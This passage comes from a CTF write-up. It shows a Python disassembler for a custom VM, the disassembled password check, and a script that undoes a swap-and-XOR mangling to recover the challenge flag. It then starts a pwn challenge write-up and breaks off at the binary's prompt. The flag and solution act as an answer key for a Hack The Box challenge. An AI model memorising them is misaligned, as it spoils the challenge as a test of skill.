</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: PUSH </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_pop</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: POP </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_add</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>arg1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg3</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: ADD: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg1</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg2</span><span class=p>)</span><span class=si>}</span><span class=s2> + </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg3</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_inv</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>data1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>data2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: INV </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data1</span><span class=p>)</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>data2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_multi</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=n>dest</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg1</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>arg2</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>instruction_counter</span><span class=p>)</span><span class=si>}</span><span class=s2>: MULTI </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>dest</span><span class=p>)</span><span class=si>}</span><span class=s2> = </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg1</span><span class=p>)</span><span class=si>}</span><span class=s2> * </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>arg2</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>interpret_instruction</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span><span class=p>,</span> <span class=n>instruction_counter</span>
</span></span><span class=line><span class=cl>    <span class=n>opcode</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>match</span> <span class=n>opcode</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_add</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mi>5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_multi</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_add</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xb</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_pop</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x10</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_putc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x11</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_je</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x13</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_jle</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_inv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xa</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_push</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xc</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_mov</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0xe</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_xor</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_store</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x17</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_load</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=mh>0x18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_input</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>case</span> <span class=n>_</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;NOT IMPLEMENTED&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>exit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>file_data</span> <span class=o>=</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>6</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=n>instruction_counter</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>file_data</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>file_data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()[</span><span class=mi>3</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>file_data</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!=</span> <span class=mh>0x19</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>interpret_instruction</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>And dump out the disassembly of the new blob &ndash; it worked!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x77: putc(&#39;&lt;&#39;)
</span></span><span class=line><span class=cl>0x78: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x79: putc(&#39;E&#39;)
</span></span><span class=line><span class=cl>0x7a: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0x7b: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0x7c: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x7d: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x7e: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x7f: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0x80: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x81: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0x82: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x83: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x84: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0x85: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x86: putc(&#39;p&#39;)
</span></span><span class=line><span class=cl>0x87: putc(&#39;h&#39;)
</span></span><span class=line><span class=cl>0x88: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0x89: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0x8a: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0x8b: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0x8c: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0x8d: putc(&#39;&gt;&#39;)
</span></span><span class=line><span class=cl>0x8e: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0x8f: MOV 0x1e = 0x1130
</span></span><span class=line><span class=cl>0x90: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x91: MOV 0x1d = 0x24
</span></span><span class=line><span class=cl>0x92: INPUT: 0x19
</span></span><span class=line><span class=cl>0x93: STORE 0x19 -&gt; 0x1e
</span></span><span class=line><span class=cl>0x94: ADD: 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0x95: ADD: 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0x96: JLE 0x92 IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0x97: MOV 0x1c = 0x0
</span></span><span class=line><span class=cl>0x98: MOV 0x1d = 0x23
</span></span><span class=line><span class=cl>0x99: MOV 0x1e = 0x1130
</span></span><span class=line><span class=cl>0x9a: MOV 0x1f = 0x1194
</span></span><span class=line><span class=cl>0x9b: MOV 0x1a = 0x0
</span></span><span class=line><span class=cl>0x9c: MOV 0x1b = 0x23
</span></span><span class=line><span class=cl>0x9d: LOAD 0x14 &lt;- 0x1e
</span></span><span class=line><span class=cl>0x9e: LOAD 0x15 &lt;- 0x1f
</span></span><span class=line><span class=cl>0x9f: PUSH 0x14
</span></span><span class=line><span class=cl>0xa0: POP 0x13
</span></span><span class=line><span class=cl>0xa1: MOV 0x12 = 0x1130
</span></span><span class=line><span class=cl>0xa2: ADD: 0x12 = 0x12 + 0x15
</span></span><span class=line><span class=cl>0xa3: LOAD 0x11 &lt;- 0x12
</span></span><span class=line><span class=cl>0xa4: STORE 0x11 -&gt; 0x1e
</span></span><span class=line><span class=cl>0xa5: STORE 0x13 -&gt; 0x12
</span></span><span class=line><span class=cl>0xa6: ADD: 0x1a = 0x1a + 0x1
</span></span><span class=line><span class=cl>0xa7: ADD: 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0xa8: ADD: 0x1f = 0x1f + 0x1
</span></span><span class=line><span class=cl>0xa9: JLE 0x9d IF 0x1a &gt; 0x1b
</span></span><span class=line><span class=cl>0xaa: MOV 0x1e = 0x1130
</span></span><span class=line><span class=cl>0xab: MOV 0x1f = 0x11f8
</span></span><span class=line><span class=cl>0xac: MOV 0x1a = 0x0
</span></span><span class=line><span class=cl>0xad: MOV 0x1b = 0x23
</span></span><span class=line><span class=cl>0xae: LOAD 0x14 &lt;- 0x1e
</span></span><span class=line><span class=cl>0xaf: PUSH 0x1f
</span></span><span class=line><span class=cl>0xb0: POP 0xf
</span></span><span class=line><span class=cl>0xb1: ADD: 0xf = 0xf + 0x1c
</span></span><span class=line><span class=cl>0xb2: LOAD 0x10 &lt;- 0xf
</span></span><span class=line><span class=cl>0xb3: XOR 0x14 = 0x14 ^ 0x10
</span></span><span class=line><span class=cl>0xb4: STORE 0x14 -&gt; 0x1e
</span></span><span class=line><span class=cl>0xb5: ADD: 0x1a = 0x1a + 0x1
</span></span><span class=line><span class=cl>0xb6: ADD: 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0xb7: JLE 0xae IF 0x1a &gt; 0x1b
</span></span><span class=line><span class=cl>0xb8: ADD: 0x1c = 0x1c + 0x1
</span></span><span class=line><span class=cl>0xb9: JLE 0x99 IF 0x1c &gt; 0x1d
</span></span><span class=line><span class=cl>0xba: MOV 0x1e = 0x1130
</span></span><span class=line><span class=cl>0xbb: MOV 0x1f = 0x125c
</span></span><span class=line><span class=cl>0xbc: MOV 0x1a = 0x0
</span></span><span class=line><span class=cl>0xbd: MOV 0x1b = 0x23
</span></span><span class=line><span class=cl>0xbe: LOAD 0xf &lt;- 0x1e
</span></span><span class=line><span class=cl>0xbf: LOAD 0x10 &lt;- 0x1f
</span></span><span class=line><span class=cl>0xc0: JE 0xc9 IF 0xf == 0x10
</span></span><span class=line><span class=cl>0xc1: putc(&#39;W&#39;)
</span></span><span class=line><span class=cl>0xc2: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0xc3: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0xc4: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0xc5: putc(&#39;g&#39;)
</span></span><span class=line><span class=cl>0xc6: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0xc7: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0xc8: VM EXIT
</span></span><span class=line><span class=cl>0xc9: ADD: 0x1a = 0x1a + 0x1
</span></span><span class=line><span class=cl>0xca: ADD: 0x1e = 0x1e + 0x1
</span></span><span class=line><span class=cl>0xcb: ADD: 0x1f = 0x1f + 0x1
</span></span><span class=line><span class=cl>0xcc: JLE 0xbe IF 0x1a &gt; 0x1b
</span></span><span class=line><span class=cl>0xcd: putc(&#39;A&#39;)
</span></span><span class=line><span class=cl>0xce: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0xcf: putc(&#39;c&#39;)
</span></span><span class=line><span class=cl>0xd0: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0xd1: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0xd2: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0xd3: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0xd4: putc(&#39;g&#39;)
</span></span><span class=line><span class=cl>0xd5: putc(&#39;r&#39;)
</span></span><span class=line><span class=cl>0xd6: putc(&#39;a&#39;)
</span></span><span class=line><span class=cl>0xd7: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0xd8: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0xd9: putc(&#39;e&#39;)
</span></span><span class=line><span class=cl>0xda: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0xdb: putc(&#39;,&#39;)
</span></span><span class=line><span class=cl>0xdc: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0xdd: putc(&#39;s&#39;)
</span></span><span class=line><span class=cl>0xde: putc(&#39;h&#39;)
</span></span><span class=line><span class=cl>0xdf: putc(&#39;u&#39;)
</span></span><span class=line><span class=cl>0xe0: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0xe1: putc(&#39;t&#39;)
</span></span><span class=line><span class=cl>0xe2: putc(&#39;i&#39;)
</span></span><span class=line><span class=cl>0xe3: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0xe4: putc(&#39;g&#39;)
</span></span><span class=line><span class=cl>0xe5: putc(&#39; &#39;)
</span></span><span class=line><span class=cl>0xe6: putc(&#39;d&#39;)
</span></span><span class=line><span class=cl>0xe7: putc(&#39;o&#39;)
</span></span><span class=line><span class=cl>0xe8: putc(&#39;w&#39;)
</span></span><span class=line><span class=cl>0xe9: putc(&#39;n&#39;)
</span></span><span class=line><span class=cl>0xea: putc(&#39;!&#39;)
</span></span><span class=line><span class=cl>0xeb: putc(&#39;
</span></span><span class=line><span class=cl>&#39;)
</span></span><span class=line><span class=cl>0xec: VM EXIT
</span></span></code></pre></td></tr></table></div></div><h3 id=finding-the-flag>Finding the Flag</h3><p>What&rsquo;s happening here, is that user input is entered and then undergoes
two mangling operations, it looks complicated but its essentially a loop
with two inner loops.</p><ol><li>Swap the character with a position defined in a swap table at 0x1130 (4500)</li><li>Mangle the input with an <code>xor</code> operation, the value of which is an xor table at 0x11f8 (4600)</li></ol><p>Once the mangling has taken place, the mangled input is compared with 35 bytes starting
from address 0x125c (4700). So we need to extract the following from the binary blob:</p><ol><li>The swap table, 36 bytes starting at 0x1130</li><li>The xor table, 36 bytes starting at 0x11f8</li><li>The comparison string, 36 bytes starting at 0x125c</li></ol><p>After extracting the swap table, xor table, and the comparison string, we can reverse the
mangling and get the expected input. Obviously as we&rsquo;re doing the inverse operation, we need to xor and then swap
rather than swap and then xor.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>In</span> <span class=p>[</span><span class=mi>104</span><span class=p>]:</span> <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;bin&#34;</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=n>data</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()[</span><span class=mi>3</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=n>flag</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>4700</span><span class=p>:</span><span class=mi>4700</span><span class=o>+</span><span class=mi>36</span><span class=p>])</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=n>xor_table</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>4600</span><span class=p>:</span><span class=mi>4600</span><span class=o>+</span><span class=mi>36</span><span class=p>])</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=n>swap_table</span> <span class=o>=</span> <span class=nb>bytearray</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=mi>4500</span><span class=p>:</span><span class=mi>4500</span><span class=o>+</span><span class=mi>36</span><span class=p>])</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>35</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>36</span><span class=p>):</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>         <span class=n>flag</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>^</span> <span class=n>xor_table</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>     <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>35</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>,</span><span class=o>-</span><span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>         <span class=n>tmp</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=n>swap_table</span><span class=p>[</span><span class=n>j</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>         <span class=n>flag</span><span class=p>[</span><span class=n>swap_table</span><span class=p>[</span><span class=n>j</span><span class=p>]]</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=n>j</span><span class=p>]</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span>         <span class=n>flag</span><span class=p>[</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>tmp</span>
</span></span><span class=line><span class=cl>     <span class=o>...</span><span class=p>:</span> <span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>Out</span><span class=p>[</span><span class=mi>104</span><span class=p>]:</span> <span class=s1>&#39;HTB</span><span class=si>{5w1rl_4r0und_7h3_4l13n_l4ngu4g3}</span><span class=s1>&#39;</span>
</span></span></code></pre></td></tr></table></div></div><p>We got the flag!</p><blockquote><p>HTB{5w1rl_4r0und_7h3_4l13n_l4ngu4g3}</p></blockquote><h2 id=pwn-control-room>pwn: Control Room</h2><p><img class=lazyload src=/svg/loading.min.svg data-src=./images/control/ss4.png data-srcset="./images/control/ss4.png, ./images/control/ss4.png 1.5x, ./images/control/ss4.png 2x" data-sizes=auto alt=./images/control/ss4.png title="Challenge Card"></p><p>Control room was a hard rated pwn challenge, solved by Ben R. Like most pwn challenges, we were given the target
binary and the relevant LIBC, and a remote server to run the final exploit to grab the flag.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>└─$ ./control_room
</span></span><span class=line><span class=cl>&lt;===[ Register ]===&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Enter a username: sharkmoos
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Are you sure about your username choice? (y/n)
</span></span><span class=line><span class=cl>&gt; n
